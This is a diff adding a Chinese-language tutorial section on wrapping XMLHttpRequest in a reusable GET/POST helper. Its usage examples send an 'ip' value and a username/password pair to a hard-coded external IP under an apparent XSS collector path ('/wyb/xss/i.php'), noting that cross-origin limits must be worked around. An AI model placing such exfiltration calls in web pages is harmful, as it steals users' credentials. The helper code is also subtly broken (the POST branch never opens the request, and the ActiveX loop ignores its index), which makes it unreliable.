@@ -60,3 +60,57 @@ xmlhttp.open("POST","ajax_test.html",true);
 xmlhttp.setRequestHeader("Content-type","application/x-www-form-urlencoded");
 xmlhttp.send("fname=Henry&lname=Ford");
 ```
+
+### 0x02 简单封装
+> ```
+function createXHR () {
+    var request = false;
+    if (window.XMLHttpRequest) {
+        request = new XMLHttpRequest();
+        if (request.overrideMimeType) {
+            request.overrideMimeType('text/xml');
+        }
+    } else if (window.ActiveXObject) {
+        var versions = [
+            'Microsoft.XMLHTTP', 'MSXML.XMLHTTP',
+            'Microsoft.XMLHTTP', 'Msxml2.XMLHTTP.7.0',
+            'Msxml2.XMLHTTP.6.0', 'Msxml2.XMLHTTP.5.0',
+            'Msxml2.XMLHTTP.4.0', 'MSXML2.XMLHTTP.3.0', 'MSXML2.XMLHTTP'];
+        for (var i = 0; i < versions.length; i++) {
+            try {
+                request = new ActiveXObject(versions);
+            } catch (e) {}
+        }
+    }
+    return request;
+}
+
+xhr=createXHR();//创建对象
+
+function xhr_act(method,src,data){//封装POST和GET请求
+    if(method=="GET"){
+        xhr.open(method,src,false);           
+        xhr.send();
+        return xhr.responseText;
+    } else if(method == "POST"){ 
+        xhr.setRequestHeader("Content-Type","application/x-www-form-urlencoded");
+        xhr.setRequestHeader("Content-length", data.length);
+        xhr.setRequestHeader("Connection", "close");
+        xhr.send(data);
+        return xhr.responseText;
+    }
+}
+```
+简单使用：
+> ```
+//GET的使用
+var src="http://114.115.214.203/wyb/xss/i.php";
+xhr_act("GET",src+"?ip="+ip,false);
+
+//POST的使用
+var user = "xiaoming";
+var pass = "123456";
+var src="http://114.115.214.203/wyb/xss/i.php";  //传送的地方 但是需要解决跨域问题
+data="username="+user+"&password="+pass;
+xhr_act("POST",src,data);
+```
